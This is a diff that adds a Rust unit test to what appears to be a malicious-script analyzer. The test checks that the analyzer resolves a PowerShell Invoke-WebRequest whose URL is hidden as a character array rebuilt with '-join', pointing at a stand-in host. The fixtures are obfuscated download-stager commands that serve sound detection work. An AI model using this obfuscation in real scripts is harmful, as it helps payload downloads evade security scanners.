@@ -18386,6 +18386,23 @@ mod ps_replace_join_tests {
     }
 
     #[test]
+    fn ps_unary_join_array_resolves() {
+        let inner = r#"Invoke-WebRequest (-join @('h','t','t','p','s',':','/','/','ps-unary-join.example','/stage'))"#;
+        let script = format!("powershell -Command \"{}\"\r\n", inner);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-unary-join.example/stage"
+            )
+        });
+        assert!(
+            has,
+            "no Download after unary -join array: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps_join_double_quoted_array_resolves() {
         let inner = r#"Invoke-WebRequest ("h","t","t","p","s",":","/","/","ps-join-dq.example","/stage" -join "")"#;
         let script = format!("powershell -Command \"{}\"\r\n", inner);
